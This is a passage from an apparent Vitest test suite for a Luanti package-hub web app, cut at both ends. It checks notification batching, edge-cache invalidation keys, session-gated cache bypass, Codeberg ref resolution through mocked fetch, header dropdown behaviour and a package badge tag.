          baselineSeededAt: nowMs - 3600 * 1000,
          recentDiscoveredPackages: {}
        },
        nowMs
      );
      expect(healedResult.notifications.length).toBe(4);
      expect(healedResult.stateUpdates.knownGitPackages).toContain('__cdb_approval_heal_v1__');

      // Subsequent run after `__cdb_approval_heal_v1__` is set does not re-notify
      const postHealResult = evaluateCatalogNotificationsBatch(
        rawDraftBootPayload,
        {
          prefs: {
            notificationsEnabled: true,
            notifyNewGitPackages: true
          },
          knownGitPackages: healedResult.stateUpdates.knownGitPackages,
          baselineSeededAt: nowMs - 3600 * 1000,
          recentDiscoveredPackages: healedResult.stateUpdates.recentDiscoveredPackages,
          seenTags: healedResult.stateUpdates.seenTags
        },
        nowMs
      );
      expect(postHealResult.notifications.length).toBe(0);

      // 4. Verify foreground `pwaService.checkAndNotifyNewGitPackages` also notifies all 4 moderated packages and records them
      const pwaService = TestBed.inject(PwaService);
      const settingsService = TestBed.inject(SettingsService);
      settingsService.notificationsEnabled.set(true);
      settingsService.notifyNewGitPackages.set(true);
      localStorage.setItem(
        'lh_known_git_packages_v1',
        JSON.stringify(['Minetest/minetest_game', '__cdb_seeded_v1__'])
      );
      localStorage.setItem('lh_notif_baseline_seeded_at_v1', String(nowMs - 3600 * 1000));
      localStorage.removeItem('lh_seen_notification_tags');
      localStorage.setItem('lh_recent_discoveries_v1', JSON.stringify({}));
      pwaService.recentDiscoveredPackages.set({});
      const sentNotifs: any[] = [];
      const origSend = pwaService.sendNativeNotification.bind(pwaService);
      pwaService.sendNativeNotification = async (payload: any) => {
        sentNotifs.push(payload);
        return true;
      };

      try {
        const notifiedCount = pwaService.checkAndNotifyNewGitPackages(
          rawDraftBootPayload.packages.map((p) => ({
            id: p.id,
            title: p.title,
            author: p.author,
            name: p.name,
            type: p.type,
            source: 'official' as const,
            created_at: p.created_at,
            thumbnail: (p as any).thumbnail
          })),
          {
            recentlyAddedIds: rawDraftBootPayload.recentlyAdded.map((p) => p.id),
            recentlyAddedTopIds: rawDraftBootPayload.recentlyAdded.slice(0, 4).map((p) => p.id)
          }
        );

        expect(notifiedCount).toBe(4);
        expect(sentNotifs.length).toBe(4);
        expect(Object.keys(pwaService.recentDiscoveredPackages())).toEqual([
          'zempik10/block_shapeshifts',
          'zempik10/animalia_shapeshifts',
          'zempik10/classic_mese_monster_shapeshift',
          'don/myeating'
        ]);
      } finally {
        pwaService.sendNativeNotification = origSend;
        pwaService.recentDiscoveredPackages.set({});
        localStorage.removeItem('lh_known_git_packages_v1');
        localStorage.removeItem('lh_notif_baseline_seeded_at_v1');
        localStorage.removeItem('lh_seen_notification_tags');
        localStorage.removeItem('lh_recent_discoveries_v1');
      }
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should enforce single-source-of-truth Edge Cache invalidation keys, shared analytics telemetry builders, and authenticated cache-bypass/sync protection', async () => {
    const {
      BOOT_CATALOG_EDGE_CACHE_KEY,
      PACKAGE_DETAIL_CACHE_VERSION,
      buildPackageDetailEdgeCacheKey,
      buildPackageReviewsEdgeCacheKey,
      buildAuthorProfileEdgeCacheKey,
      buildPackageCacheInvalidationKeys,
      buildDualPeriodDateRange,
      computeCombinedTelemetryArrays
    } = await import('../../functions/api/lib/upstream');
    const {
      timingSafeEqualStrings,
      shouldHonorAuthenticatedNoCache,
      createSessionToken
    } = await import('../../functions/api/auth/lib/session');
    const { onRequestPost: syncContentDbPost } = await import('../../functions/api/users/[username]/sync-contentdb');

    // 1. Verify centralized Edge Cache key builders & invalidation list
    expect(buildPackageDetailEdgeCacheKey('Sakel', 'X_Farming', 'full', 'en')).toBe(
      `https://edge-cache.luantihub.local/${PACKAGE_DETAIL_CACHE_VERSION}/full/sakel/x_farming`
    );
    expect(buildPackageDetailEdgeCacheKey('Sakel', 'X_Farming', 'lite', 'sk')).toBe(
      `https://edge-cache.luantihub.local/${PACKAGE_DETAIL_CACHE_VERSION}/lite/sk/sakel/x_farming`
    );
    const invalidationKeys = buildPackageCacheInvalidationKeys('Sakel', 'X_Farming', {
      includeBootCatalog: true,
      includeAuthorProfile: true,
      includeGitRepoScan: true
    });
    expect(invalidationKeys).toContain(
      `https://edge-cache.luantihub.local/${PACKAGE_DETAIL_CACHE_VERSION}/full/sakel/x_farming`
    );
    expect(invalidationKeys).toContain(
      `https://edge-cache.luantihub.local/${PACKAGE_DETAIL_CACHE_VERSION}/lite/sakel/x_farming`
    );
    expect(invalidationKeys).toContain(
      `https://edge-cache.luantihub.local/${PACKAGE_DETAIL_CACHE_VERSION}/full-readme/sakel/x_farming`
    );
    expect(invalidationKeys).toContain(buildPackageReviewsEdgeCacheKey('sakel', 'x_farming'));
    expect(invalidationKeys).toContain(buildAuthorProfileEdgeCacheKey('sakel'));
    expect(invalidationKeys).toContain(BOOT_CATALOG_EDGE_CACHE_KEY);
    expect(invalidationKeys).toContain('/__git_repo_scan_v11/sakel/x_farming');

    // 2. Verify shared dual-period date range & combined telemetry builder
    const range = buildDualPeriodDateRange(7);
    expect(range.dates.length).toBe(7);
    expect(range.prevDates.length).toBe(7);
    const d1Map = new Map<string, any>([
      [
        range.dates[6],
        {
          downloads_count: 5,
          platform_luanti: 3,
          platform_web: 2,
          reason_new: 2,
          reason_update: 1,
          reason_dependency: 0,
          reason_web: 2,
          views_luanti: 4,
          views_web: 6
        }
      ]
    ]);
    const combined = computeCombinedTelemetryArrays(range.dates, range.prevDates, d1Map, null);
    expect(combined.summary.periodDownloads).toBe(5);
    expect(combined.summary.platformsTotal).toEqual({ luanti: 3, web: 2 });
    expect(combined.summary.reasonsTotal).toEqual({ new: 2, update: 1, dependency: 0, web: 2 });
    expect(combined.summary.totalViews).toBe(10);
    expect(combined.summary.conversionRatePercent).toBe(50);

    // 3. Verify constant-time secret comparison & authenticated ?nocache=1 gate
    expect(timingSafeEqualStrings('Bearer super_secret_token_12345', 'Bearer super_secret_token_12345')).toBe(true);
    expect(timingSafeEqualStrings('Bearer super_secret_token_12345', 'Bearer super_secret_token_12346')).toBe(false);
    expect(timingSafeEqualStrings('Bearer short', 'Bearer super_secret_token_12345')).toBe(false);
    expect(timingSafeEqualStrings('', '')).toBe(false);

    const unauthReq = new Request('https://luantihub.local/api/packages/sakel/x_farming/reviews?nocache=1');
    expect(await shouldHonorAuthenticatedNoCache(unauthReq, 'test_secret', 'reviews:sakel/x_farming')).toBe(false);

    const token = await createSessionToken('usr_sakel', 'test_secret', { username: 'sakel', verified: true });
    const authReq = new Request('https://luantihub.local/api/packages/sakel/x_farming/reviews?nocache=1', {
      headers: { Cookie: `lh_session=${token}` }
    });
    expect(await shouldHonorAuthenticatedNoCache(authReq, 'test_secret', 'reviews:sakel/x_farming', 60_000)).toBe(true);
    // Second immediate call within cooldown window is rejected
    expect(await shouldHonorAuthenticatedNoCache(authReq, 'test_secret', 'reviews:sakel/x_farming', 60_000)).toBe(false);

    // 4. Verify POST /api/users/:username/sync-contentdb with force=true or unregistered author requires authentication (401)
    const unauthForceSyncRes = await syncContentDbPost({
      request: new Request('https://luantihub.local/api/users/sakel/sync-contentdb', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ force: true })
      }),
      env: { DB: {}, SESSION_SECRET: 'test_secret' },
      params: { username: 'sakel' }
    });
    expect(unauthForceSyncRes.status).toBe(401);
  });

  it('should deep-link OS notifications to reviews/releases in PackageDetailModal and resolve verified Git branch/tag diff URLs', async () => {
    const {
      buildPackageUpdateNotificationSpec,
      buildReviewNotificationSpec
    } = await import('./core/utils/notification-engine');
    const { fetchGitReleaseNotesBetweenRefs } = await import('../../functions/api/lib/upstream');

    // 1. Verify notification specs include modalSection, reviewId, and expandReleaseNotes
    const updateSpec = buildPackageUpdateNotificationSpec(
      {
        id: 'TenPlus1/mobs_animal',
        author: 'TenPlus1',
        name: 'mobs_animal',
        title: 'Mobs Animal',
        type: 'mod',
        release_id: '55123'
      },
      'TenPlus1/mobs_animal',
      '55123|2026-11-07T08:00:00Z|a1b2c3d'
    );
    expect(updateSpec.data.packageId).toBe('TenPlus1/mobs_animal');
    expect(updateSpec.data.modalSection).toBe('releases');
    expect(updateSpec.data.expandReleaseNotes).toBe(true);

    const reviewSpec = buildReviewNotificationSpec({
      id: 'lh_901',
      package_id: 'TenPlus1/mobs_animal',
      package_title: 'Mobs Animal',
      rating: 5,
      reviewer_username: 'miner42',
      comment: 'Awesome animals mod!',
      created_at: '2026-11-07T08:30:00Z'
    });
    expect(reviewSpec).not.toBeNull();
    expect(reviewSpec!.data.packageId).toBe('TenPlus1/mobs_animal');
    expect(reviewSpec!.data.modalSection).toBe('reviews');
    expect(reviewSpec!.data.reviewId).toBe('901');

    // 2. Verify Codeberg main -> master resolution in fetchGitReleaseNotesBetweenRefs
    const origFetch = globalThis.fetch;
    try {
      globalThis.fetch = (async (input: RequestInfo | URL) => {
        const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
        // Simulate Codeberg where 'main' does not exist (404) and 'master' is the real default branch
        if (url.includes('info/refs?service=git-upload-pack')) {
          const pkt = (str: string) => (str.length + 4).toString(16).padStart(4, '0') + str;
          const body =
            pkt('# service=git-upload-pack\n') +
            '0000' +
            pkt('a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 HEAD\0multi_ack symref=HEAD:refs/heads/master\n') +
            pkt('a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 refs/heads/master\n') +
            pkt('f0e1d2c3b4a5f0e1d2c3b4a5f0e1d2c3b4a5f0e1 refs/tags/2026-10-01\n') +
            '0000';
          return new Response(body, { status: 200 });
        }
        if (url.includes('codeberg.org/api/v1/repos/tenplus1/mobs_animal/commits')) {
          if (url.includes('sha=main')) {
            return new Response('Not Found', { status: 404 });
          }
          if (url.includes('sha=master') || url.includes('sha=2026-10-01') || !url.includes('sha=')) {
            return new Response(
              JSON.stringify([
                {
                  sha: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
                  commit: {
                    message: 'Update sheep and cow textures',
                    author: { name: 'TenPlus1', date: '2026-11-06T12:00:00Z' }
                  },
                  html_url: 'https://codeberg.org/tenplus1/mobs_animal/commit/a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2'
                }
              ]),
              { status: 200, headers: { 'Content-Type': 'application/json' } }
            );
          }
        }
        return new Response('Not Found', { status: 404 });
      }) as typeof fetch;

      const resolvedNotes = await fetchGitReleaseNotesBetweenRefs(
        'https://codeberg.org/tenplus1/mobs_animal',
        'tenplus1',
        'mobs_animal',
        { headRef: 'main', defaultBranch: 'main' }
      );
      expect(resolvedNotes.commits.length).toBe(1);
      expect(resolvedNotes.head_ref).toBe('master');
      expect(resolvedNotes.resolved_default_branch).toBe('master');
      expect(resolvedNotes.compare_url).toBe('https://codeberg.org/tenplus1/mobs_animal/commits/branch/master');

      // Also verify tag refs on Codeberg resolve to /commits/tag/<tag> instead of /commits/branch/<tag>
      const resolvedTagNotes = await fetchGitReleaseNotesBetweenRefs(
        'https://codeberg.org/tenplus1/mobs_animal',
        'tenplus1',
        'mobs_animal',
        { headRef: '2026-10-01', defaultBranch: 'master' }
      );
      expect(resolvedTagNotes.commits.length).toBe(1);
      expect(resolvedTagNotes.head_ref).toBe('2026-10-01');
      expect(resolvedTagNotes.compare_url).toBe('https://codeberg.org/tenplus1/mobs_animal/commits/tag/2026-10-01');
    } finally {
      globalThis.fetch = origFetch;
    }

    // 3. Verify clicking a review notification scrolls to & highlights the target review (even on page 2)
    const pkgService = TestBed.inject(PackageService);
    const mobsPkg = (pkgService as any).normalizePackage({
      id: 'TenPlus1/mobs_animal',
      author: 'TenPlus1',
      name: 'mobs_animal',
      title: 'Mobs Animal',
      type: 'mod',
      repo_url: 'https://codeberg.org/tenplus1/mobs_animal'
    });
    const sevenReviews = Array.from({ length: 7 }, (_, i) => ({
      id: `lh_${900 + i}`,
      package_id: 'TenPlus1/mobs_animal',
      source: 'luantihub' as const,
      rating: 5,
      comment: `Review number ${i + 1}`,
      created_at: '2026-11-07T08:00:00Z',
      author: { username: `user_${i + 1}`, display_name: `User ${i + 1}`, avatar_url: 'logo.svg' }
    }));
    const sampleReleases = [
      {
        id: 55123,
        version: '#55123',
        tag_name: '2026-10-01',
        commit_sha: 'a1b2c3d4e5f6',
        download_url: '/api/packages/TenPlus1/mobs_animal/download?release=55123',
        released_at: '2026-11-06T12:00:00Z'
      }
    ];
    (pkgService as any).reviewsCache.set('tenplus1/mobs_animal', sevenReviews);
    (pkgService as any).releasesCache.set('tenplus1/mobs_animal', sampleReleases);
    vi.spyOn(pkgService, 'loadPackageDetails').mockResolvedValue(undefined);
    vi.spyOn(pkgService, 'fetchReviews').mockResolvedValue(sevenReviews);
    vi.spyOn(pkgService, 'fetchPackageReleases').mockResolvedValue(sampleReleases);
    const notesSpy = vi.spyOn(pkgService, 'fetchReleaseNotesForRelease').mockResolvedValue({
      source: 'commits',
      head_ref: 'master',
      compare_url: 'https://codeberg.org/tenplus1/mobs_animal/commits/branch/master',
      resolved_default_branch: 'master',
      commits: [
        {
          sha: 'a1b2c3d4e5f6',
          short_sha: 'a1b2c3d',
          title: 'Update sheep and cow textures',
          author_name: 'TenPlus1',
          committed_at: '2026-11-06T12:00:00Z',
          url: 'https://codeberg.org/tenplus1/mobs_animal/commit/a1b2c3d4e5f6'
        }
      ]
    });

    // Request focus on the 6th review (`lh_905`, which is on page 2 since REVIEWS_PAGE_SIZE = 5)
    pkgService.requestModalSectionFocus({
      packageId: 'TenPlus1/mobs_animal',
      section: 'reviews',
      reviewId: '905'
    });

    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    modalFixture.componentInstance.package = mobsPkg;
    modalFixture.detectChanges();
    await modalFixture.whenStable();
    modalFixture.detectChanges();

    expect(modalFixture.componentInstance.activeTab()).toBe('reviews');
    expect(modalFixture.componentInstance.reviewsPage()).toBe(2);
    expect(modalFixture.componentInstance.highlightedReviewId()).toBe('lh_905');

    // 4. Verify clicking a package_update notification switches to releases and auto-expands the latest release notes
    pkgService.requestModalSectionFocus({
      packageId: 'TenPlus1/mobs_animal',
      section: 'releases',
      expandReleaseNotes: true
    });
    modalFixture.detectChanges();
    await modalFixture.whenStable();
    modalFixture.detectChanges();

    expect(modalFixture.componentInstance.activeTab()).toBe('releases');
    expect(modalFixture.componentInstance.releasesPage()).toBe(1);
    const latestRelKey = modalFixture.componentInstance.getReleaseNotesKey(sampleReleases[0], 0);
    expect(modalFixture.componentInstance.isReleaseNotesExpanded(latestRelKey)).toBe(true);
    expect(notesSpy).toHaveBeenCalled();

    // 5. Verify clicking a new_review notification for a brand-new review (`lh_999`) not in reviewsCache invalidates the stale cache and fetches fresh reviews
    const brandNewReview = {
      id: 'lh_999',
      package_id: 'TenPlus1/mobs_animal',
      source: 'luantihub' as const,
      rating: 5,
      comment: 'Freshly submitted review!',
      created_at: '2026-11-07T09:30:00Z',
      author: { username: 'new_reviewer', display_name: 'New Reviewer', avatar_url: 'logo.svg' }
    };
    const fetchReviewsSpy = vi
      .spyOn(pkgService, 'fetchReviews')
      .mockResolvedValue([brandNewReview, ...sevenReviews]);

    pkgService.requestModalSectionFocus({
      packageId: 'TenPlus1/mobs_animal',
      section: 'reviews',
      reviewId: 'lh_999'
    });
    expect((pkgService as any).reviewsCache.has('tenplus1/mobs_animal')).toBe(false);

    modalFixture.detectChanges();
    await modalFixture.whenStable();
    modalFixture.detectChanges();

    expect(fetchReviewsSpy).toHaveBeenCalledWith(expect.anything(), true);
    expect(modalFixture.componentInstance.activeTab()).toBe('reviews');
    expect(modalFixture.componentInstance.reviewsPage()).toBe(1);
    expect(modalFixture.componentInstance.highlightedReviewId()).toBe('lh_999');

    // 6. Verify cold-start URL query-parameter deep linking (`?tab=releases&notes=1` and `?tab=reviews&reviewId=lh_905`)
    (pkgService as any)._packages.set([mobsPkg]);
    (pkgService as any).syncStateFromUrl('/package/TenPlus1/mobs_animal?tab=releases&notes=1');
    const coldReleaseFocus = pkgService.consumeModalSectionFocus('TenPlus1/mobs_animal');
    expect(coldReleaseFocus).toEqual(
      expect.objectContaining({
        packageId: 'TenPlus1/mobs_animal',
        section: 'releases',
        expandReleaseNotes: true
      })
    );

    (pkgService as any).syncStateFromUrl('/package/TenPlus1/mobs_animal?tab=reviews&reviewId=lh_905');
    const coldReviewFocus = pkgService.consumeModalSectionFocus('TenPlus1/mobs_animal');
    expect(coldReviewFocus).toEqual(
      expect.objectContaining({
        packageId: 'TenPlus1/mobs_animal',
        section: 'reviews',
        reviewId: 'lh_905'
      })
    );

    modalFixture.destroy();
  });

  it('should keep top-row dropdown buttons clickable in WCO titlebar mode by elevating Row 1 above Row 2 and disabling drag while any header dropdown is open', () => {
    const pwaService = TestBed.inject(PwaService);
    const pkgService = TestBed.inject(PackageService);
    const i18n = TestBed.inject(TranslationService);

    pwaService.isWcoActive.set(true);
    pwaService.isWcoCompact.set(false);
    i18n.setLocale('sk');

    const headerFixture = TestBed.createComponent(HeaderComponent);
    const headerComp = headerFixture.componentInstance;
    headerFixture.detectChanges();

    const rootEl = headerFixture.nativeElement as HTMLElement;
    const headerEl = rootEl.querySelector('header.luanti-wco-header') as HTMLElement;
    const row1El = rootEl.querySelector('.luanti-app-header-inner') as HTMLElement;
    expect(headerEl).toBeTruthy();
    expect(row1El).toBeTruthy();
    expect(row1El.classList.contains('relative')).toBe(true);
    expect(row1El.classList.contains('z-30')).toBe(true);
    expect(headerEl.classList.contains('luanti-wco-menu-open')).toBe(false);

    // Row 2 Category Navigation Strip must sit at z-10 with explicit luanti-wco-no-drag
    const row2El = headerEl.children[1] as HTMLElement;
    expect(row2El).toBeTruthy();
    expect(row2El.classList.contains('relative')).toBe(true);
    expect(row2El.classList.contains('z-10')).toBe(true);
    expect(row2El.classList.contains('luanti-wco-no-drag')).toBe(true);

    // 1. Language Dropdown: top-row button ("EN English") must be clickable in WCO mode
    headerComp.toggleLanguageMenu(new MouseEvent('click'));
    headerFixture.detectChanges();

    expect(headerComp.isLanguageMenuOpen()).toBe(true);
    expect(headerEl.classList.contains('luanti-wco-menu-open')).toBe(true);
    const langDropdown = rootEl.querySelector('.glass-dropdown.luanti-wco-no-drag') as HTMLElement;
    expect(langDropdown).toBeTruthy();
    const firstLangBtn = langDropdown.querySelector('button') as HTMLButtonElement;
    expect(firstLangBtn).toBeTruthy();
    expect(firstLangBtn.textContent).toContain('English');
    firstLangBtn.click();
    headerFixture.detectChanges();

    expect(i18n.currentLocale()).toBe('en');
    expect(headerComp.isLanguageMenuOpen()).toBe(false);
    expect(headerEl.classList.contains('luanti-wco-menu-open')).toBe(false);

    // 2. Ko-fi Dropdown: top-right "Open Ko-fi in new tab" and "Close Ko-fi panel" buttons must be clickable in WCO mode
    headerComp.toggleKofiMenu(new MouseEvent('click'));
    headerFixture.detectChanges();

    expect(headerComp.isKofiMenuOpen()).toBe(true);
    expect(headerEl.classList.contains('luanti-wco-menu-open')).toBe(true);
    const kofiCloseBtn = rootEl.querySelector('button[aria-label="Close Ko-fi panel"]') as HTMLButtonElement;
    const kofiExtLink = rootEl.querySelector('a[aria-label="Open Ko-fi in new tab"]') as HTMLAnchorElement;
    expect(kofiCloseBtn).toBeTruthy();
    expect(kofiExtLink).toBeTruthy();
    expect(kofiExtLink.getAttribute('href')).toBe('https://ko-fi.com/sakel');

    kofiCloseBtn.click();
    headerFixture.detectChanges();
    expect(headerComp.isKofiMenuOpen()).toBe(false);
    expect(headerEl.classList.contains('luanti-wco-menu-open')).toBe(false);

    // Re-open Ko-fi and verify clicking "Open Ko-fi in new tab" also closes the dropdown cleanly
    headerComp.toggleKofiMenu(new MouseEvent('click'));
    headerFixture.detectChanges();
    const kofiExtLink2 = rootEl.querySelector('a[aria-label="Open Ko-fi in new tab"]') as HTMLAnchorElement;
    kofiExtLink2.addEventListener('click', e => e.preventDefault());
    kofiExtLink2.click();
    headerFixture.detectChanges();
    expect(headerComp.isKofiMenuOpen()).toBe(false);
    expect(headerEl.classList.contains('luanti-wco-menu-open')).toBe(false);

    // 3. Settings Dropdown: top-row "In-Game Setup" button must be clickable in WCO mode
    const openSetupSpy = vi.spyOn(pkgService, 'openSetupModal');
    headerComp.toggleSettingsMenu(new MouseEvent('click'));
    headerFixture.detectChanges();

    expect(headerComp.isSettingsMenuOpen()).toBe(true);
    expect(headerEl.classList.contains('luanti-wco-menu-open')).toBe(true);
    const settingsDropdown = rootEl.querySelector('.glass-dropdown.luanti-wco-no-drag') as HTMLElement;
    expect(settingsDropdown).toBeTruthy();
    const inGameSetupBtn = settingsDropdown.querySelector('button') as HTMLButtonElement;
    expect(inGameSetupBtn).toBeTruthy();
    inGameSetupBtn.click();
    headerFixture.detectChanges();

    expect(openSetupSpy).toHaveBeenCalledTimes(1);
    expect(headerComp.isSettingsMenuOpen()).toBe(false);
    expect(headerEl.classList.contains('luanti-wco-menu-open')).toBe(false);

    pwaService.isWcoActive.set(false);
    headerFixture.destroy();
  });

  it('should agnostically track metadata options and badge_tags ("100% Organic Code" leaf badge with consistent tooltips & arrow cursor) across tiles, detail modal, and submit modal', async () => {
    const {
      ORGANIC_CODE_TAG,
      ORGANIC_CODE_LABEL,
      ORGANIC_CODE_TOOLTIP,
      LUANTIHUB_BADGE_TAGS,
      parseBadgeTagsArray,
      hasOrganicCodeTag
    } = await import('./core/config/package-utils.config');
    const { PackageBadgesComponent } = await import('./shared/components/package-badges.component');
    const { SubmitModalComponent } = await import('./features/submit/submit-modal.component');

    // 1. Verify agnostic badge_tags helpers and constants (with leaf icon)
    expect(ORGANIC_CODE_TAG).toBe('organic_code');
    expect(ORGANIC_CODE_LABEL).toBe('100% Organic Code');
    expect(ORGANIC_CODE_TOOLTIP).toBe('Zero artificial additives. Grown with sunlight, coffee, and patience.');
    expect(LUANTIHUB_BADGE_TAGS.length).toBeGreaterThanOrEqual(1);
    expect(LUANTIHUB_BADGE_TAGS[0].name).toBe('organic_code');
    expect(LUANTIHUB_BADGE_TAGS[0].icon).toBe('leaf');
    expect(parseBadgeTagsArray('["organic_code", "100% Organic Code", "invalid_tag"]')).toEqual(['organic_code']);
    expect(hasOrganicCodeTag({ badge_tags: ['organic_code'] })).toBe(true);
    expect(hasOrganicCodeTag({ badge_tags: [] })).toBe(false);

    // 2. Verify PackageBadgesComponent renders the green leaf badge in the [TOP 10] [MOD] [ContentDB] [Git] [leaf] [Featured] row
    //    with uniform .glass-badge sizing, arrow cursor (cursor-default, no cursor-help), and localized tooltips on every badge
    const badgesFixture = TestBed.createComponent(PackageBadgesComponent);
    const samplePkg: LuantiPackage = {
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      short_desc: 'Forsaken lands',
      type: 'mod',
      thumbnail: 'logo.svg',
      banner: 'logo.svg',
      downloads: 1200,
      score: 4.9,
      license: 'LGPL-2.1-only',
      tags: ['environment'],
      badge_tags: ['organic_code'],
      featured: true,
      source: 'git',
      sources: ['official', 'git']
    };
    badgesFixture.componentInstance.package = samplePkg;
    badgesFixture.componentInstance.showFeatured = true;
    badgesFixture.componentInstance.top10Label = 'TOP 10';
    badgesFixture.detectChanges();

    const badgesEl = badgesFixture.nativeElement as HTMLElement;
    const top10Badge = badgesEl.querySelector('[data-testid="top10-badge"]') as HTMLElement;
    const typeBadge = badgesEl.querySelector('[data-testid="type-badge"]') as HTMLElement;
    const contentDbBadge = badgesEl.querySelector('[data-testid="contentdb-badge"]') as HTMLElement;
    const gitBadge = badgesEl.querySelector('[data-testid="git-badge"]') as HTMLElement;
    const leafBadge = badgesEl.querySelector('[data-testid="organic-code-badge"]') as HTMLElement;
    const featuredBadge = badgesEl.querySelector('[data-testid="featured-badge"]') as HTMLElement;

    for (const badge of [top10Badge, typeBadge, contentDbBadge, gitBadge, leafBadge, featuredBadge]) {
      expect(badge).toBeTruthy();
      expect(badge.classList.contains('glass-badge')).toBe(true);
      expect(badge.classList.contains('cursor-default')).toBe(true);
      expect(badge.classList.contains('cursor-help')).toBe(false);
    }

    expect(leafBadge.getAttribute('aria-label')).toBe('100% Organic Code');
    expect(leafBadge.querySelector('svg[lucideLeaf]')).toBeTruthy();
    expect(leafBadge.querySelector('svg[lucideSprout]')).toBeNull();

    // Verify localized translation keys exist in Slovak as well as English
    const i18n = TestBed.inject(TranslationService);
    i18n.setLocale('sk');
    badgesFixture.detectChanges();
    expect(leafBadge.getAttribute('aria-label')).toBe('100 % organický kód');
    i18n.setLocale('en');
    badgesFixture.detectChanges();
    badgesFixture.destroy();

    // 3. Verify PackageDetailModalComponent metadata editor & sidebar display + cache-safe persistence across loadPackageDetails
    const authService = TestBed.inject(AuthService);
    const pkgService = TestBed.inject(PackageService);
    (authService as any)._currentUser.set({
      id: 'u_sakel',
      username: 'SaKeL',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      role: 'admin',
      is_admin: true,
      identities: [{ provider: 'codeberg', username: 'SaKeL', verified: true }]
    });

    const basePkg: LuantiPackage = {
      ...samplePkg,
      badge_tags: []
    };
    (pkgService as any)._packages.set([basePkg]);
    (pkgService as any)._activePackage.set(basePkg);

    let capturedPatchBody: any = null;
    let capturedDetailGetUrl = '';
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(async (input: any, init?: RequestInit) => {
      const url = typeof input === 'string' ? input : input?.url || '';
      if (url.includes('/api/packages/SaKeL/everness') && init?.method === 'PATCH') {
        capturedPatchBody = JSON.parse(String(init.body || '{}'));
        return new Response(
          JSON.stringify({
            success: true,
            package_id: 'SaKeL/everness',
            tags: capturedPatchBody.tags || ['environment'],
            badge_tags: capturedPatchBody.badge_tags || ['organic_code']
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (
        (url.includes('/api/packages/SaKeL/everness/?') || url.endsWith('/api/packages/SaKeL/everness/')) &&
        (!init?.method || init.method === 'GET')
      ) {
        capturedDetailGetUrl = url;
        // Simulate a stale browser-cached GET response from before the PATCH (badge_tags: [])
        return new Response(
          JSON.stringify({
            id: 'SaKeL/everness',
            author: 'SaKeL',
            name: 'everness',
            title: 'Everness',
            type: 'mod',
            license: 'LGPL-2.1-only',
            downloads: 1200,
            tags: ['environment'],
            badge_tags: []
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } });
    });

    try {
      const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
      modalFixture.componentInstance.package = basePkg;
      modalFixture.detectChanges();

      // Open Metadata & Tags editor
      modalFixture.componentInstance.openEditTags();
      modalFixture.detectChanges();

      const modalEl = modalFixture.nativeElement as HTMLElement;
      const editOrganicBtn = modalEl.querySelector('[data-testid="edit-badge-tag-organic"]') as HTMLButtonElement;
      expect(editOrganicBtn).toBeTruthy();
      expect(editOrganicBtn.textContent).toContain('100% Organic Code');
      expect(editOrganicBtn.querySelector('svg[lucideLeaf]')).toBeTruthy();

      // Select "100% Organic Code" and save
      editOrganicBtn.click();
      modalFixture.detectChanges();
      expect(modalFixture.componentInstance.editableBadgeTags()).toEqual(['organic_code']);

      await modalFixture.componentInstance.onSaveTags();
      modalFixture.detectChanges();

      // Verify PATCH request included badge_tags and offline-agnostic fallback seed fields
      expect(capturedPatchBody).toBeTruthy();
      expect(capturedPatchBody.badge_tags).toEqual(['organic_code']);
      expect(capturedPatchBody.title).toBe('Everness');
      expect(capturedPatchBody.type).toBe('mod');

      // Verify updated package state now has badge_tags: ['organic_code'] and renders sidebar + header leaf badges
      expect(modalFixture.componentInstance.package.badge_tags).toEqual(['organic_code']);
      expect(modalEl.querySelector('[data-testid="sidebar-organic-code-tag"] svg[lucideLeaf]')).toBeTruthy();
      expect(modalEl.querySelector('[data-testid="organic-code-badge"] svg[lucideLeaf]')).toBeTruthy();

      // Verify "100% Organic Code" (organic_code) is present in availableTags() for the Catalog Tags filter bar,
      // while selectableGenreTags() excludes badge tag IDs from the 5-genre-tag picker
      expect(pkgService.availableTags().some(t => t.name === 'organic_code' && t.title === '100% Organic Code')).toBe(true);
      expect(pkgService.selectableGenreTags().some(t => t.name === 'organic_code')).toBe(false);

      // Verify any future custom metadata tag or badge_tag saved on a package is also added to availableTags() and filterable
      pkgService.ensureTagsRegisteredInAvailableTags(['future_custom_tag', 'future_badge_tag']);
      expect(pkgService.availableTags().some(t => t.name === 'future_custom_tag')).toBe(true);
      expect(pkgService.availableTags().some(t => t.name === 'future_badge_tag')).toBe(true);

      // Verify filtering the catalog by 'organic_code' matches the package
      pkgService.setTagFilter('organic_code');
      expect(pkgService.filteredPackages().map(p => p.id)).toEqual(['SaKeL/everness']);
      pkgService.setTagFilter('all');
      await new Promise(resolve => setTimeout(resolve, 0));

      // Verify drawer filtering (Author / Profile Drawer) matches packages by badge_tags as well as tags
      expect(filterAndSortDrawerPackages(pkgService.packages(), { tag: 'organic_code' }).map(p => p.id)).toEqual([
        'SaKeL/everness'
      ]);

      // Simulate reopening the modal and triggering loadPackageDetails while browser cache still has stale badge_tags: []
      (pkgService as any).edgeApiAvailable = true;
      (pkgService as any)._activePackage.set(pkgService.packages()[0]);
      await pkgService.loadPackageDetails(pkgService.packages()[0], true);
      expect(capturedDetailGetUrl).toContain('_t=');
      expect(pkgService.packages()[0].badge_tags).toEqual(['organic_code']);
      expect(pkgService.activePackage()?.badge_tags).toEqual(['organic_code']);

      modalFixture.destroy();
    } finally {
      fetchSpy.mockRestore();
    }

    // 4. Verify SubmitModalComponent renders the "100% Organic Code" badge tag selector with leaf icon
    const submitFixture = TestBed.createComponent(SubmitModalComponent);
    submitFixture.detectChanges();
    const submitEl = submitFixture.nativeElement as HTMLElement;
